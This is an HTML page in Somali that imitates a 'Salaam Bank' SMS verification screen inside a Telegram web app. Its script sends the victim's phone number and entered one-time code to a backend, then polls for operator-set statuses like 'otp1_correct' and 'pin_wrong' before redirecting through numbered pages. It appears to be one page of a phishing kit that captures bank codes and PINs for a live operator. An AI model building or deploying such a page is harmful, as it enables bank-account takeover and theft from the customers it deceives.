<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Salaam Bank - Xaqiijinta</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --bank-primary: #0056b3;
            --bank-gradient: linear-gradient(180deg, #007bff 0%, #0056b3 100%);
            --bg-color: #f7f7f7;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #666666;
            --border-bank: #0056b3;
            --btn-disabled-bg: #e0e0e0;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }

        .header-box { width: 100%; background: var(--bank-gradient); padding: 25px 20px 40px; color: white; text-align: center; font-size: 26px; font-weight: 800; }
        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
        .card { background: var(--card-bg); width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }

        h2 { margin: 0 0 12px 0; font-size: 22px; color: var(--text-dark); text-align: center; font-weight: 800; }
        .instruction { font-size: 14px; color: var(--text-muted); margin: 0 0 12px 0; text-align: center; line-height: 1.4; }
        .phone-number { font-size: 16px; font-weight: 800; color: var(--text-dark); margin-bottom: 25px; display: flex; justify-content: center; gap: 8px; }

        .code-input-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
        .code-box { width: 60px; height: 60px; border: 2px solid var(--border-bank); border-radius: 10px; text-align: center; font-size: 24px; font-weight: 800; outline: none; }

        .resend-text { text-align: center; color: var(--text-muted); font-size: 14px; margin: 20px 0; }
        .submit-btn { width: 100%; background-color: var(--btn-disabled-bg); color: #999; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .submit-btn.active { background-color: var(--bank-primary); color: white; cursor: pointer; }

        .footer-banner { width: 100%; background: var(--bank-gradient); height: 80px; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; margin-top: 40px; }
        .overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: var(--bank-gradient); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; padding: 24px; text-align: center; }
        .spinner { width: 56px; height: 56px; border: 5px solid rgba(255,255,255,0.3); border-top: 5px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-message { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; text-align: center; font-weight: 600; }
    </style>
</head>

<body>

<div class="header-box">Salaam Bank</div>

<div class="main-container">
    <div class="card">
        <h2>Xaqiijinta Koodka</h2>
        <p class="instruction">Geli koodka 4-ta xaraf/lambar ah ee laguu soo diray SMS-ka</p>

        <div class="phone-number">
            <span>🇸🇴</span>
            <span id="displayPhone">+252 ...</span>
        </div>

        <div class="code-input-container">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
        </div>

        <div id="errorText" class="error-message">Koodku waa khalad ama wuu dhacay.</div>
        <div class="resend-text" id="timerBox">Dib u dir <span id="timer">60</span> ilbiriqsi kadib</div>

        <button id="submitBtn" class="submit-btn" disabled>XAQIIJI</button>
    </div>
</div>

<div class="footer-banner"></div>

<div class="overlay" id="statusOverlay">
    <div>
        <div class="spinner"></div>
        <div style="font-size: 22px; font-weight: 800;">Fadlan sug...</div>
    </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');
    let checkInterval = null;

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
    if (savedPhone) displayPhone.textContent = `+252 ${savedPhone}`;

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            checkInputs();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index - 1].focus();
        });
    });

    function checkInputs() {
        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
        const isComplete = fullCode.length === 4;
        submitBtn.disabled = !isComplete;
        submitBtn.classList.toggle('active', isComplete);
        errorText.style.display = 'none';
    }

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);
        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();
                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                } else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
                    clearInterval(checkInterval);
                    window.location.href = "/page6?error=wrongpin";
                }
            } catch (err) {}
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;
        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        statusOverlay.style.display = "flex";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: savedPhone, code: codeValue, country: "SO" })
            });
            const data = await res.json();
            if (data.success) startStatusPolling();
        } catch (err) { statusOverlay.style.display = "none"; }
    });
});
</script>

</body>
</html>
